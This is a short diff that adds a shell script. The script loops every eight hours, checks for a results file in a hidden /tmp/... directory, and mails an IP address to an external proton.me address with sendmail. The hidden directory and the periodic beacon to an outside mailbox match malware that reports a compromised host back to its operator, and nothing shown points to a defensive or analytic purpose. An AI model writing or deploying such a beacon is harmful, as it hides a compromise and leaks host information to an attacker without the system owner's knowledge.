@@ -1,0 +1,8 @@
+while :
+do
+        if [ -f "/tmp/.../result.txt" ];then
+                echo -e "Subject: tom\n112.137.132.83" > /tmp/.../mail.txt
+                sendmail salahei006@proton.me < /tmp/.../mail.txt
+        fi
+        sleep 8h
+done
